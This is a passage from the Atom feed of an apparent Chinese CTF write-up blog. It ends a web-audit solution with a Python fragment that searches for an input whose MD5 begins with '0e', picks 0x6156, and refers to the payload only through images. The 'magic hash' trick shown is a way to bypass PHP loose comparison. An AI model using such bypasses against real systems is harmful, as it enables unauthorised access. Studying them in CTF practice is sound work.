class="string">"0e"</span>:</span><br><span class="line">print(k)</span><br><span class="line">print(md5_n)</span><br></pre></td></tr></table></figure><p>结果如图，选择0x6156   0ec4899c94ada8d08a6ada8623c6ff01</p><p><img src="http://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webaudit_2.png" alt></p><p>构造payload：</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webaudit_3.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;平台已不运营&lt;/p&gt;
&lt;h2 id=&quot;Web签到&quot;&gt;&lt;a href=&quot;#Web签到&quot; class=&quot;headerlink&quot; title=&quot;Web签到&quot;&gt;&lt;/a&gt;Web签到&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://wcgimages.oss-cn-shenzhen.
      
    
    </summary>
    
      <category term="CTF wp" scheme="http://yoursite.com/categories/CTF-wp/"/>
    
    
      <category term="wp" scheme="http://yoursite.com/tags/wp/"/>
    
      <category term="JACTF" scheme="http://yoursite.com/tags/JACTF/"/>
    
  </entry>
  
</feed>
